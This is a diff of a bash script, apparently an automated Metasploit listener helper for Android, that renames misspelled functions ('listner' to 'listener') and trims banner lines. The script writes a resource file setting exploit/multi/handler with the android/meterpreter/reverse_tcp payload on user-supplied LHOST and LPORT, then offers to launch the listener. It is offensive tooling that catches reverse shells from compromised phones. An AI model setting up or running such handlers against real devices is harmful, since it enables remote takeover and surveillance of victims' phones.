@@ -7,13 +7,10 @@ fi
 
 clear
 echo -e "\n\e[1;93m
-
 __ __         __                               _______ _______ _______ _______
 |  |__|.-----.|  |_.-----.-----.-----.----.    |   _   |   |   |_     _|       |
 |  |  ||__ --||   _|  -__|     |  -__|   _|    |       |   |   | |   | |   -   |
 |__|__||_____||____|_____|__|__|_____|__|      |___|___|_______| |___| |_______|
-
-
                                            \e[0m"
 lhost_taker () {
 
@@ -37,13 +34,13 @@ lport_taker () {
             
 }
 
-listner_creator () {
+listener_creator () {
 
 	echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost2\nset LPORT $lport2\nexploit" > metasploit/.exploit.rc
 
 }
 
-start_listner () {
+start_listener () {
 
 	while true; do
 	  read -p $'\n\e[93;1mDo you want to start the MSF Listener.\e[1;97m (Y/N) \e[91;1m? : \e[1;93m' yn
@@ -62,8 +59,8 @@ main () {
 
 	lhost_taker
 	lport_taker
-	listner_creator
-	start_listner	
+	listener_creator
+	start_listener	
 
 }
 
